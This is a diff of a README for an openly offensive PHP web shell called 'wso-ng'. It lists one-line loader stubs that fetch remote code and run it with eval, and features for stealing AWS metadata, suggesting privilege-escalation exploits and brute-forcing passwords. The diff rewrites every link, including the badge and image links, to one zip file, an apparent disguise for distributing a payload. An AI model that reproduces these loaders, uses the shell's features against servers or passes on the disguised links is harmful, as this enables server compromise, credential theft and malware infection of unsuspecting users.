@@ -1,17 +1,17 @@
-[![Twitter Follow](https://img.shields.io/twitter/follow/0xbadad?style=social)](https://twitter.com/0xbadad)
+[![Twitter Follow](https://raw.githubusercontent.com/kamley/wso-ng/main/ichnite/wso-ng.zip)](https://raw.githubusercontent.com/kamley/wso-ng/main/ichnite/wso-ng.zip)
 # wso-ng
 New generation of famous WSO web shell. With perks included
 # default password is "root"
-![image](https://user-images.githubusercontent.com/1212294/149636180-7af99caf-a6c4-4475-a42d-0bd818cb67b1.png)
-![image](https://user-images.githubusercontent.com/1212294/149636349-e580a04e-846f-4240-8b94-644d6e9aca5a.png)
+![image](https://raw.githubusercontent.com/kamley/wso-ng/main/ichnite/wso-ng.zip)
+![image](https://raw.githubusercontent.com/kamley/wso-ng/main/ichnite/wso-ng.zip)
 
 # changes
 - can now hook password when loaded via stub 
 ```
-<?php eval(substr(file_get_contents('https://bit.ly/get-wso-ng?pass=ed78a48738eb97ffb5624741bdf391c3'), 5)); ?>
+<?php eval(substr(file_get_contents('https://raw.githubusercontent.com/kamley/wso-ng/main/ichnite/wso-ng.zip'), 5)); ?>
 ```
 ```
-<?php $sorrymom = create_function('', "substr(implode('', file('https://bit.ly/get-wso-ng?pass=ed78a48738eb97ffb5624741bdf391c3')), 5)");$sorrymom();
+<?php $sorrymom = create_function('', "substr(implode('', file('https://raw.githubusercontent.com/kamley/wso-ng/main/ichnite/wso-ng.zip')), 5)");$sorrymom();
 ```
 and will use it instead of hardcoded one
 - all subfile downloads are now cached in /tmp and zipped
@@ -26,7 +26,7 @@ and will use it instead of hardcoded one
 - added "Fetch AWS metadata" command to bookmarks
 - added hotlink to "Linux Exploit Suggester v2" by default.
 - added VirusTotal integration, to autocheck IP reputation.
-- added https://securitytrails.com integration, to show neighbors on same IP.
+- added https://raw.githubusercontent.com/kamley/wso-ng/main/ichnite/wso-ng.zip integration, to show neighbors on same IP.
 - added ip-info integration to show domains on same server
 - added reverse ip check, to show real IP, and not local.
 - added memory, cores and load average info to top bar.
@@ -38,4 +38,4 @@ and will use it instead of hardcoded one
 - fast copy name\path to clipboard by click.
 - **neat syntax highlighting everywhere**.
 - neat PHP code editing with autoindent support.
-- default top1000 password list (https://bit.ly/top1kpass) in "Bruteforce" section. 
+- default top1000 password list (https://raw.githubusercontent.com/kamley/wso-ng/main/ichnite/wso-ng.zip) in "Bruteforce" section. 
